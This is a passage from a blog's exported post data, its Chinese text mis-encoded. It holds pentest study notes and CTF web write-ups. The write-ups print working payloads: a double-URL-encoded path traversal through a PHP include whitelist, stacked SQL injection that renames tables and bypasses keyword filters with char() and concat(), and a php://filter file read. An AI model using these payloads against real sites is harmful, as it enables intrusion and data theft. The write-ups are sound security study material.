¶æ–‡ä»¶ï¼‰ï¼Œä¸€èˆ¬æ™®é€šç”¨æˆ·ä¸ä¼šä½¿ç”¨ï¼Œæ ¹ç”¨æˆ·ä½¿ç”¨ã€‚<br>/usr/binä¸€èˆ¬å­˜æ”¾çš„åªæ˜¯å¯¹ç”¨æˆ·å’Œç³»ç»Ÿæ¥è¯´â€œä¸æ˜¯å¿…éœ€çš„â€ç¨‹åºï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ã€‚<br>/usr/sbinä¸€èˆ¬å­˜æ”¾ç”¨äºç³»ç»Ÿç®¡ç†çš„ç³»ç»Ÿç®¡ç†çš„ä¸æ˜¯å¿…éœ€çš„ç¨‹åºï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ã€‚</p><p><strong>/libä¸/usr/lib:</strong></p><p>/libå’Œ/usr/libçš„åŒºåˆ«ç±»ä¼¼/bin,/sbinä¸/usr/bin,/usr/sbinã€‚<br>/libä¸€èˆ¬å­˜æ”¾å¯¹äºç”¨æˆ·å’Œç³»ç»Ÿæ¥è¯´â€œå¿…é¡»â€çš„åº“ï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ã€‚<br>/usr/libä¸€èˆ¬å­˜æ”¾çš„åªæ˜¯å¯¹ç”¨æˆ·å’Œç³»ç»Ÿæ¥è¯´â€œä¸æ˜¯å¿…éœ€çš„â€åº“ï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¸—é€æµ‹è¯•ç¬”è®°</title>
      <link href="/2021/01/15/shen-tou-ce-shi-bi-ji/"/>
      <url>/2021/01/15/shen-tou-ce-shi-bi-ji/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1426649237&auto=1&height=66"></iframe><h1 id="æ¸—é€æµ‹è¯•"><a href="#æ¸—é€æµ‹è¯•" class="headerlink" title="æ¸—é€æµ‹è¯•"></a>æ¸—é€æµ‹è¯•</h1><h2 id="1-ä¿¡æ¯æ”¶é›†é˜¶æ®µ"><a href="#1-ä¿¡æ¯æ”¶é›†é˜¶æ®µ" class="headerlink" title="1.ä¿¡æ¯æ”¶é›†é˜¶æ®µ"></a>1.ä¿¡æ¯æ”¶é›†é˜¶æ®µ</h2><h3 id="èµ„äº§æ”¶é›†ï¼š"><a href="#èµ„äº§æ”¶é›†ï¼š" class="headerlink" title="èµ„äº§æ”¶é›†ï¼š"></a>èµ„äº§æ”¶é›†ï¼š</h3><p>1.ä»ä¸»åŸŸåå‡ºå‘ï¼Œå‘å…¶æ—ç«™æ‰©æ•£</p><p>2.å­åŸŸåæ”¶é›†ï¼ˆlayerå­åŸŸåæŒ–æ˜æœºï¼ˆæšä¸¾æ€§è´¨ï¼‰ï¼Œ<a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">oneforall</a>ï¼ˆæ ¹æ®æ¥å£ï¼Œéœ€è¦é…ç½®apiï¼šåœ¨\OneForAll-master\config\api.py ï¼‰ï¼‰ï¼Œç›¸å…³åŸŸåæ”¶é›†</p><p>3.é€šè¿‡æœç´¢å¼•æ“ï¼ˆç¬¬ä¸‰æ–¹ï¼‰ï¼šå¸¸ç”¨ç¬¬ä¸‰æ–¹å­åŸŸåçˆ†ç ´æ¥å£</p><p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><p><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></p><p><a href="https://www.virustotal.com/gui/home/search" target="_blank" rel="noopener">https://www.virustotal.com/gui/home/search</a></p><p><a href="http://tool.chinaz.com/subdomain/" target="_blank" rel="noopener">http://tool.chinaz.com/subdomain/</a></p><p><a href="http://searchdns.netcraft.com/" target="_blank" rel="noopener">http://searchdns.netcraft.com/</a></p><p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><p><a href="https://chapangzhan.com/ï¼ˆæ—ç«™æŸ¥è¯¢ï¼‰" target="_blank" rel="noopener">https://chapangzhan.com/ï¼ˆæ—ç«™æŸ¥è¯¢ï¼‰</a></p><p>4.appï¼Œå°ç¨‹åºï¼Œå…¬ä¼—å·</p><p>5.å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢ï¼ˆåŸºæœ¬æ— æ•ˆä¿¡æ¯ï¼‰ï¼š</p><p>çˆ±ç«™ç½‘ï¼Œ<a href="https://beian.tianyancha.com/" target="_blank" rel="noopener">å¤©çœ¼æŸ¥</a></p><p>6.ipä¿¡æ¯æ”¶é›†ï¼šæœ‰çš„ä¼ä¸šåšäº†cdnåŠ é€Ÿï¼Œä¾‹å¦‚ä½¿ç”¨ä¸ƒç‰›äº‘é’ˆå¯¹å›¾åºŠè¿›è¡ŒåŠ é€Ÿï¼Œæ‰€ä»¥å°±éœ€è¦è¿›è¡Œcdnçš„ç»•è¿‡ï¼Œæ¥æ‰¾åˆ°è¢«åŠ é€Ÿçš„æœåŠ¡å™¨ï¼ˆipåœ°å€ï¼‰</p><p>ç»•è¿‡æ–¹æ³•ï¼š</p><ul><li><p><strong>å¤šåœ°ping</strong>ï¼ˆå›½å¤–ï¼‰</p></li><li><p><strong>å¯¹åˆ†ç«™è¿›è¡Œping</strong></p></li></ul><p>7.åœ¨çº¿cmsæŒ‡çº¹è¯†åˆ«</p><p>äº‘æ‚‰æŒ‡çº¹ï¼š<a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a><br>æ½®æ±æŒ‡çº¹ï¼š<a href="http://finger.tidesec.net/" target="_blank" rel="noopener">http://finger.tidesec.net/</a></p><p>8.æœåŠ¡å™¨/ä¸­é—´å™¨/ç«™ç‚¹æ¶æ„ä¿¡æ¯</p><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>å¦‚æœé‡åˆ°ç½‘ç»œé—®é¢˜ï¼šservice networking restarté‡å¯ä¸€ä¸‹ç½‘ç»œæœåŠ¡</p><p>-p 8011ï¼ˆæŒ‡å®š8011ç«¯å£ï¼‰</p><p>-Fï¼ˆå¿«é€Ÿæ‰«æï¼‰ -iLï¼ˆä»æ–‡æœ¬æ–‡ä»¶é‡Œé¢æ‰«æä¸»æœºåˆ—è¡¨ï¼Œå¤šçº¿ç¨‹ï¼‰1.txt -v</p><h2 id="msfå·¥å…·"><a href="#msfå·¥å…·" class="headerlink" title="msfå·¥å…·"></a>msfå·¥å…·</h2><p>å»ºç«‹ä¸€ä¸ªäº¤äº’å¼çš„shell</p><pre><code>shellpython -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;#å‰ææ˜¯æ‰¾åˆ°è¯¥æ¡†æ¶çš„æ¼æ´ï¼Œå¹¶ä¸”æ‰“å…¥è¿›å»</code></pre><p>## </p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctfä¹‹Web</title>
      <link href="/2021/01/15/buuctf-zhi-web/"/>
      <url>/2021/01/15/buuctf-zhi-web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=536976917&auto=1&height=66"></iframe><h1 id="2021-01-15"><a href="#2021-01-15" class="headerlink" title="2021-01-15"></a>2021-01-15</h1><h2 id="ç¬¬ä¸€é¢˜-HCTF-2018-WarmUp"><a href="#ç¬¬ä¸€é¢˜-HCTF-2018-WarmUp" class="headerlink" title="ç¬¬ä¸€é¢˜:[HCTF 2018]WarmUp"></a>ç¬¬ä¸€é¢˜:[HCTF 2018]WarmUp</h2><p>è¿™é‡Œæ‡’å¾—ä¸Šä¼ å›¾ç‰‡äº†ï¼Œæ‰€ä»¥å°±ç›´æ¥ç¬”è®°äº†</p><p>æºä»£ç é‡Œé¢æœ‰1.source.phpï¼Œæ‰€ä»¥æ‰“å¼€ä»¥åè¿˜ä¼šå‘å…ˆ2.hint.php</p><p>1æ‰“å¼€åä¼šå‘ç°æ˜¯ä»£ç å®¡è®¡</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/**issetåœ¨phpä¸­ç”¨æ¥åˆ¤æ–­å˜é‡æ˜¯å¦å£°æ˜ï¼Œè¯¥å‡½æ•°è¿”å›å¸ƒå°”ç±»å‹çš„å€¼ï¼Œå³true/falseã€‚issetåªèƒ½ç”¨äºå˜é‡ï¼Œå› ä¸ºä¼ é€’ä»»ä½•å…¶å®ƒå‚æ•°éƒ½å°†é€ æˆè§£æé”™è¯¯ã€‚is_stringç”¨æ¥æ£€æŸ¥ä¼ å…¥çš„å€¼æ˜¯å¦ä¸ºå­—ç¬¦ä¸²**/</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/**in_array â€” æ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼ï¼Œè¿™é‡Œåˆ¤æ–­pageæ˜¯å¦å­˜åœ¨äºwhitelistæ•° ç»„ ä¸­ ï¼Œ å­˜ åœ¨ åˆ™ è¿” å› true**/</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/**            å¯¹mb_substrå‡½æ•°çš„è§£é‡Šï¼šå‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œé’ˆå¯¹ä¸­æ–‡            &lt;?php               echo mb_substr("èœé¸Ÿæ•™ç¨‹", 0, 2);               // è¾“å‡ºï¼šèœé¸Ÿ            ?>            mb_strpos (è¦è¢«æ£€æŸ¥çš„å­—ç¬¦ä¸²,è¦æœç´¢çš„å­—ç¬¦ä¸²)            &lt;?php             $str = 'http://www.feiniaomy.com';             echo mb_strpos($str,'niao');            ?>            è¾“å‡ºç»“æœï¼š14            è¿™é‡Œæ•´ä¸ªåµŒå¥—æ„æ€æ˜¯æˆªå–pageä¸­â€™?â€˜å‰éƒ¨åˆ†             **/</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/**            è¿™é‡Œä¹Ÿå°±æ˜¯è¯´è¿›è¡Œäº†ä¸¤æ¬¡urlè§£ç ï¼Œä¸€æ¬¡æ˜¯æœåŠ¡å™¨è‡ªåŠ¨è§£ç ï¼Œä¸€æ¬¡æ˜¯æ­¤å¤„è§£ç             **/</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token shell-comment comment">#è¿™æ®µä»£ç æ„æ€å°±æ˜¯å“åº”çš„fileå‚æ•°ä¸èƒ½ä¸ºç©ºï¼Œè€Œä¸”å¿…é¡»æ˜¯æ˜¯å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”è¿˜è¦æ£€æŸ¥åœ¨checkfileé‡Œé¢æ£€æŸ¥ï¼Œè¿™é‡Œå°†æˆ‘ä»¬çš„çš„å€¼ä¼ åˆ°emmmç±»é‡Œé¢çš„checkFileå‡½æ•°ï¼Œè¿™ä¸‰ä¸ªå€¼é€šè¿‡&amp;&amp;é€»è¾‘ä¸è¿ç®—ç¬¦è¿æ¥ä¹Ÿå°±æ˜¯è¦æ±‚è¿™å—å‡½æ•°çš„è¿”å›å€¼è¦å…¨ä¸ºçœŸæ‰èƒ½æ‰§è¡Œifé‡Œé¢çš„æ–‡ä»¶åŒ…å«çš„ä»£ç  å¦åˆ™å°±æ‰§è¡Œelseé‡Œé¢çš„å›¾ç‰‡ä»£ç #</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2æ‰“å¼€åä¼šå‘ç°ï¼šflag not here, and flag in ffffllllaaaagggg</p><p>ä¹Ÿå°±æ˜¯è¯´flagåœ¨è¿™ä¸ªæ–‡ä»¶é‡Œé¢</p><p>æ‰€ä»¥è¯´è¿™ä¸ªç»è¿‡åˆ†æå®Œä»¥åï¼Œå°±æ˜¯ç»“æ„/?file=source.php?/../../../../ffffllllaaaagggg</p><p>ç„¶åå°±æ˜¯å¯¹ï¼Ÿè¿›è¡Œurlç¼–ç %253Fè¿™é‡Œ../å°±æ˜¯</p><p>æ‰€ä»¥å°±æ˜¯/?file=hint.php%253f/../../../../../../../../ffffllllaaaagggg</p><p>åŒæ ·/?file=source.php%253f/../../../../../../../../ffffllllaaaaggggéƒ½å¯ä»¥</p><p>å› ä¸ºsourceä¸hintéƒ½åœ¨whitelistçš„ç™½åå•é‡Œé¢ï¼Œè¿™é‡Œå°±æ˜¯ç±»ä¼¼äºå°†è¿™ä¸ªé¢˜ç›®å®šå‘</p><p>æ²¡ä»€ä¹ˆä¸œè¥¿</p><p>flag{7c4ca688-51e1-4235-958a-fad970c48f7b}</p><p>å›å¤´è¡¥å……ï¼š</p><p>includeå‡½æ•°æœ‰è¿™ä¹ˆä¸€ä¸ªç¥å¥‡çš„åŠŸèƒ½ï¼šä»¥å­—ç¬¦â€˜/â€™åˆ†éš”ï¼ˆè€Œä¸”ä¸è®¡ä¸ªæ•°ï¼‰ï¼Œè‹¥æ˜¯åœ¨å‰é¢çš„å­—ç¬¦ä¸²æ‰€ä»£è¡¨çš„æ–‡ä»¶æ— æ³•è¢«PHPæ‰¾åˆ°ï¼Œåˆ™PHPä¼šè‡ªåŠ¨åŒ…å«â€˜/â€™åé¢çš„æ–‡ä»¶â€”â€”æ³¨æ„æ˜¯æœ€åä¸€ä¸ªâ€˜/â€™ã€‚</p><h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><p>è¾“å…¥1å¾—</p><pre><code>array(2) {  [0]=&gt;  string(1) &quot;1&quot;  [1]=&gt;  string(7) &quot;hahahah&quot;}</code></pre><p>è¾“å…¥1â€™</p><pre><code>error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39;&#39; at line 1</code></pre><p>æŠ¥é”™äº†</p><p>è¾“å…¥ï¼š1â€™ or 1=1#</p><pre><code>array(2) {  [0]=&gt;  string(1) &quot;1&quot;  [1]=&gt;  string(7) &quot;hahahah&quot;}array(2) {  [0]=&gt;  string(1) &quot;2&quot;  [1]=&gt;  string(12) &quot;miaomiaomiao&quot;}array(2) {  [0]=&gt;  string(6) &quot;114514&quot;  [1]=&gt;  string(2) &quot;ys&quot;}</code></pre><p>çˆ†å‡ºä¸€äº›æ²¡æœ‰ç”¨çš„æ•°ç»„ï¼Œä½†æ˜¯è¯´æ˜äº†ä¸‡èƒ½é’¥åŒ™å¥½ç”¨ï¼Œå­˜åœ¨æ³¨å…¥ç‚¹</p><p>è¾“å…¥ï¼š1â€™ union select 1,2#</p><pre><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre><p>è¿™å¯èƒ½æ˜¯è¿›å…¥äº†æŸä¸€æ­¥ç®—æ³•ä¸­äº†åæ­£è”åˆæŸ¥è¯¢åº”è¯¥æ˜¯å‡‰äº†ï¼ˆå…¨å‰§ç»ˆï¼‰</p><p>è€ƒè™‘å †å æ³¨å…¥ï¼ˆå­¦åˆ°äº†ï¼‰ï¼š</p><p>åŸç†ï¼šåœ¨sqlè¯­å¥ä¸­ä»¥;è¡¨ç¤ºä¸€ä¸ªè¯­å¥çš„ç»“æŸï¼Œå¦‚æœä¸€ä¸ªsqlè¯­å¥ç»“æŸåå†æ¥ç€ä¸€ä¸ªsqlè¯­å¥ï¼Œå°±ä¼šæ‰§è¡Œè¿™ä¸¤æ¡sqlè¯­å¥</p><p>è¾“å…¥ï¼š1â€™;show databases;#</p><pre><code>array(1) {  [0]=&gt;  string(11) &quot;ctftraining&quot;}array(1) {  [0]=&gt;  string(18) &quot;information_schema&quot;}array(1) {  [0]=&gt;  string(5) &quot;mysql&quot;}array(1) {  [0]=&gt;  string(18) &quot;performance_schema&quot;}array(1) {  [0]=&gt;  string(9) &quot;supersqli&quot;}array(1) {  [0]=&gt;  string(4) &quot;test&quot;}</code></pre><p>è¾“å…¥ï¼š-1â€™;show tables from supersqli;#</p><pre><code>array(1) {  [0]=&gt;  string(16) &quot;1919810931114514&quot;}array(1) {  [0]=&gt;  string(5) &quot;words&quot;}</code></pre><p>è¾“å…¥ï¼š-1â€™;show columns from  <code>1919810931114514</code>;#(å­—ç¬¦ä¸²ä¸ºè¡¨åæ“ä½œæ—¶è¦åŠ åå¼•å·)``</p><pre><code>array(6) {  [0]=&gt;  string(4) &quot;flag&quot;  [1]=&gt;  string(12) &quot;varchar(100)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;}</code></pre><p>è¾“å…¥ï¼š1â€™;show columns from words;#ï¼ˆæŸ¥çœ‹è¡¨wordsè¡¨çš„å­—æ®µï¼‰</p><pre><code>array(6) {  [0]=&gt;  string(2) &quot;id&quot;  [1]=&gt;  string(7) &quot;int(10)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;}array(6) {  [0]=&gt;  string(4) &quot;data&quot;  [1]=&gt;  string(11) &quot;varchar(20)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;}</code></pre><p><strong>æ³¨æ„ï¼ˆé‡ç‚¹ï¼‰</strong>ï¼š</p><pre><code>  - 1&#39; or 1=1#    å¸Œæœ›å±•ç¤ºæ‰€æœ‰å†…å®¹  - ä¸€èˆ¬SQLä»£ç ä¸­ä¼šæœ‰è¿™copyä¹ˆä¸€æ®µselect * from ï¼ˆè¡¨åï¼‰ where = å˜é‡ï¼Œ  - å½“é€šè¿‡æ³¨å…¥åä¼šå˜æˆselect * from ï¼ˆè¡¨åï¼‰  where id = å˜é‡ OR 1=1;  - å°±ä¼šä½¿ç™¾whereåé¢çš„è¡¨è¾¾å¼å˜æˆä¸€å¥å¯æœ‰å¯æ— çš„è¡¨è¾¾å¼ï¼Œå› ä¸ºorå‰é¢æ‰§è¡ŒæˆåŠŸï¼Œä¸”1=1ä¸ºçœŸã€‚ä¸ä¼šæŠ¥é”™  - å°±ä¸select * from ï¼ˆè¡¨åï¼‰ç›¸ç­‰ç„¶åå°±å¯ä»¥é€šè¿‡è¿™ç§å¥å¼æ¥å–å¾—å½“å‰æ•°æ®è¡¨ä¸­æ‰€æœ‰çš„ç”¨æˆ·ä¿¡æ¯ç­”ã€‚  - ä½†æ˜¾ç„¶å¤±è´¥äº†ï¼ŒçŒœæµ‹è¡¨ååº”è¯¥æ˜¯wordsï¼Œæ‰€ä»¥æ‰æ²¡æœ‰æ˜¾ç¤ºflagï¼Œæ‰€ä»¥å¯èƒ½æ˜¯select * from words where id = å˜é‡</code></pre><pre><code>1&#39;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</code></pre><p>è§£é‡Šï¼š</p><pre><code>- rename table `words` to `words1`; ä¿®æ”¹è¡¨ words æ”¹åä¸ºå…¶å®ƒï¼Œ- rename table `1919810931114514` to `words`;ä¿®æ”¹è¡¨ 1919810931114514 æ”¹åä¸º words ï¼Œ- alter table `words` change `flag` `id` varchar(100) character set utf8 collate utf8_general_ci not NULL;ä¿®æ”¹åˆ— flag æ”¹åä¸º id ï¼Œ- æˆ–è€…å¯ä»¥ alter table words add id int unsigned not Null auto_increment primary key;åœ¨è¡¨ 1919810931114514 æ’å…¥ä¸€åˆ— idï¼Œ- ç„¶åå† 1&#39; or 1=1# ï¼Œå±•ç¤ºflag</code></pre><h3 id="2021-4-27è¡¥å……ï¼š"><a href="#2021-4-27è¡¥å……ï¼š" class="headerlink" title="2021-4-27è¡¥å……ï¼š"></a>2021-4-27è¡¥å……ï¼š</h3><p>å·²ç»å­¦ä¹ å®Œäº†alterè¯­å¥ï¼Œå’Œé¢„å˜é‡</p><p>è¿™é‡Œä¸»è¦å¯¹é¢„å¤„ç†è¿›è¡Œè§£é‡Šï¼š</p><pre><code>SET @tn = &#39;`1919810931114514`&#39;;  //å­˜å‚¨è¡¨åSET @sql = concat(&#39;select * from &#39;, @tn);  //å­˜å‚¨SQLè¯­å¥PREPARE name from @sql;   //é¢„å®šä¹‰SQLè¯­å¥EXECUTE name;  //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥(DEALLOCATE || DROP) PREPARE sqla;  //åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥</code></pre><p>æˆ–è€…ï¼š</p><p>åˆ©ç”¨char()å‡½æ•°å°†selectå­—ç¬¦ä¸²çš„ASCIIç è½¬ä¸ºselectå­—ç¬¦ä¸²ï¼Œæ¥ç€ç”¨concat()å‡½æ•°é•œåƒæ‹¼æ¥åˆ°selectæŸ¥è¯¢è¯­å¥ï¼Œä»è€Œç»•è¿‡è¿‡æ»¤</p><pre><code>1&#39;;PREPARE hacker from concat(char(115,101,108,101,99,116), &#39; * from `1919810931114514` &#39;);EXECUTE hacker;#</code></pre><pre><code>1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39;* from `1919810931114514`&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#</code></pre><pre><code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE hacker;#</code></pre><pre><code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE hacker;#</code></pre><pre><code>flag{e5334182-fc16-4c20-8ac3-753301d2925d}</code></pre><p>VARCHAR(size)ï¼šä¿å­˜å¯å˜é•¿åº¦çš„å­—ç¬¦ä¸²ï¼ˆå¯åŒ…å«å­—æ¯ã€æ•°å­—ä»¥åŠç‰¹æ®Šå­—ç¬¦ï¼‰ã€‚åœ¨æ‹¬å·ä¸­æŒ‡å®šå­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ã€‚æœ€å¤š 255 ä¸ªå­—ç¬¦ã€‚<strong>æ³¨é‡Šï¼š</strong>å¦‚æœå€¼çš„é•¿åº¦å¤§äº 255ï¼Œåˆ™è¢«è½¬æ¢ä¸º TEXT ç±»å‹ã€‚</p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h2><p>phpä¼ªåè®®</p><p>ç‰¹ç‚¹ï¼šæ–‡ä»¶åŒ…å«ï¼Œ/?file=flag.php</p><p>payload:file=php://filter/read=convert.base64-encode/resource=flag.php</p><p>å¾—ï¼šPD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MzEyOTZhNWUtZjRiMy00ZTY1LTg5MGEtOThjNjZhMWU5MWI0fQo=</p><p>base64å¾—ï¼š</p><pre><code>&lt;?phpecho &quot;Can you find out the flag?&quot;;//flag{31296a5e-f4b3-4e65-890a-98c66a1e91b4}</code></pre><h2 